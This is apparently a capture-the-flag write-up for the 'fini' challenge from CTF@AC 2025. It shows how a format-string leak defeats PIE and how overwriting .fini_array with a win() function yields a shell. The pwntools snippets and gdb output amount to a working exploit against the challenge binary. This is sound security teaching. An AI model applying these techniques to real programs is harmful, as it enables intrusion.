---
title: "CTF@AC 2025 – fini: Hijacking .fini_array for a shell"
date: 2025-09-14
toc: true
---

> *Hope you can FINIsh this challenge.*

```bash
$ file ./challenge | tr ',' '\n'
./challenge: ELF 64-bit LSB pie executable
 x86-64
 version 1 (SYSV)
 dynamically linked
 interpreter /lib64/ld-linux-x86-64.so.2
 BuildID[sha1]=4293e516c8a744cddc10088c31128d37fd365557
 for GNU/Linux 3.2.0
 not stripped

$ pwn checksec ./challenge
[*] '/home/kali/Desktop/ctfs/others/fini/challenge'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No

$ ./challenge 
=== FINIsh this challenge ;) ===
What's your name?
z0v3r1n
Hello, z0v3r1n
!
1) write
2) exit
> 1
Addr (hex): 1234
Value (hex, 8 bytes): abc
zsh: segmentation fault  ./challenge
```

Looking at the defined functions we find a `win()` function:

```
pwndbg> info func                                  
All defined functions:

Non-debugging symbols:                             
0x0000000000001000  _init
0x0000000000001030  puts@plt
0x0000000000001040  system@plt
0x0000000000001050  printf@plt
0x0000000000001060  fgets@plt                      
0x0000000000001070  setvbuf@plt                    
0x0000000000001080  __isoc99_scanf@plt
0x0000000000001090  exit@plt
0x00000000000010a0  __cxa_finalize@plt
0x00000000000010b0  main
0x0000000000001290  _start
0x00000000000012c0  deregister_tm_clones
0x00000000000012f0  register_tm_clones
0x0000000000001330  __do_global_dtors_aux
0x0000000000001370  frame_dummy
0x0000000000001380  win
0x000000000000138c  _fini

pwndbg> disas win
Dump of assembler code for function win:
   0x0000000000001380 <+0>:     lea    rdi,[rip+0xc7d]        # 0x2004
   0x0000000000001387 <+7>:     jmp    0x1040 <system@plt>
End of assembler dump.

pwndbg> x/s 0x2004   
0x2004: "/bin/sh" 
```

Looking at the implementation of the greeting in the `main()` function we can see that the program prints our name unsafely i.e. without any format specifiers giving rise to fmt-string vulnerability.

```c
  puts("=== FINIsh this challenge ;) ===");
  puts("What\'s your name?");
  fgets((char *)name,0x80,stdin);
  printf("Hello, ");
  printf((char *)name);
```

We can confirm the fmt-string vulnerability by inputting a fmt-string:

```shell
$ ./challenge        
=== FINIsh this challenge ;) ===
What's your name?
%x.%x
Hello, 341636c0.0
!
1) write
2) exit
> ^C
```

We can use this fmt-string vulnerability to leak a PIE addr using which we can bypass ASLR.

```
$ gdb -q ./challenge
...SNIP...
pwndbg> disas main
```

![](https://github.com/user-attachments/assets/bdb321d0-f439-42ca-bf25-c6e28b3168d7)

Breaking after the `fgets()` call to analyze the memory around our input:

```shell
pwndbg> b *main+146
Breakpoint 1 at 0x1142
pwndbg> r
...SNIP...
=== FINIsh this challenge ;) ===
What\'s your name?
AAAAAAAA

Breakpoint 1, 0x0000555555555142 in main ()
...SNIP...
pwndbg> search AAAAAAAA stack
Searching for byte: b'AAAAAAAA'
[stack]         0x7fffffffdc00 'AAAAAAAA\n'

pwndbg> vmmap
...SNIP...
►   0x555555554000     0x555555555000 r--p     1000       0 challenge
►   0x555555555000     0x555555556000 r-xp     1000    1000 challenge
►   0x555555556000     0x555555557000 r--p     1000    2000 challenge
►   0x555555557000     0x555555558000 rw-p     1000    2000 challenge
...SNIP
    
pwndbg> dq 0x7fffffffdc00 30
00007fffffffdc00     4141414141414141 000000000000000a
00007fffffffdc10     0000000000040000 ffffffffffffffff
00007fffffffdc20     0000000000000040 0000000000000004
00007fffffffdc30     0000000000008000 0000000000000000
00007fffffffdc40     0000008e00000006 0000000000000000
00007fffffffdc50     0000000000000000 0000000000000000
00007fffffffdc60     0000000000000000 0000000000000000
00007fffffffdc70     0000000000000000 0000000000000000
00007fffffffdc80     00007fffffffddb8 0000000000000001
00007fffffffdc90     0000000000000000 00007fffffffddc8
00007fffffffdca0     00007ffff7ffd000 00007ffff7dd9ca8
00007fffffffdcb0     00007fffffffdda0 00005555555550b0
00007fffffffdcc0     0000000155554040 00007fffffffddb8
00007fffffffdcd0     00007fffffffddb8 6a511514e74da407
00007fffffffdce0     0000000000000000 00007fffffffddc8

pwndbg> p (0x00007fffffffdcb0-0x00007fffffffdc00)/8 + 9
$3 = 31
```

Leaking the PIE address using the fmt-string vulnerability:

```
$ ./challenge
=== FINIsh this challenge ;) ===
What's your name?
%31$lx
Hello, 55ca370b20b0
!
1) write
2) exit
> ^C
```

We can calculate the PIE base by substracting the offset:

```python
io.sendlineafter(b"?", b"%31$lx")
io.recvuntil(b", ")
pieBase = int(io.recvline().strip(), 16) - 0x10b0
log.success(f"pieBase: {hex(pieBase)}")
```

![](https://github.com/user-attachments/assets/15e61dd5-be72-42a3-b61d-f5e7e58cc405)

Now as the name of the challenge is **fini** which points us to the `.fini_array` which contains an array of functions which are executed sometime after main returns.

```
pwndbg> info file
		...SNIP...
        0x00000000000031c8 - 0x00000000000031d0 is .fini_array
		...SNIP...
```

We can overwrite this to the address of `win()` function so, when the main returns and the `.fini_array` function entries are executed our `win()` function spawns a shell.

Setting up the overwrite:

```python
FINI_ARRAY = pieBase + 0x31c8
WIN_ADDR   = pieBase + 0x1380

io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"(hex): ", hex(FINI_ARRAY).encode())
io.sendlineafter(b"(hex, 8 bytes): ", hex(WIN_ADDR).encode())
```

We can confirm the overwrite in `gdb`:

```
pwndbg> info file
		...SNIP...
        0x000055e8d60221c8 - 0x000055e8d60221d0 is .fini_array
		...SNIP...

pwndbg> p win
$1 = {<text variable, no debug info>} 0x55e8d6020380 <win>

pwndbg> x/gx 0x000055e8d60221c8
0x55e8d60221c8: 0x000055e8d6020380
```

Now, as we have overwritten the `.fini_array[0]` when we exit our `win()` function will be executed which will spawn a shell.

```python
io.sendlineafter(b"> ", b"2")
io.interactive()
```

![](https://github.com/user-attachments/assets/98e5bc85-b0b8-4da0-8058-988922b34fc1)

You can find the full exploit script [here](https://raw.githubusercontent.com/z0v3r1n/z0v3r1n.github.io/main/content/posts/ctf_ac_fini/exploit.py).

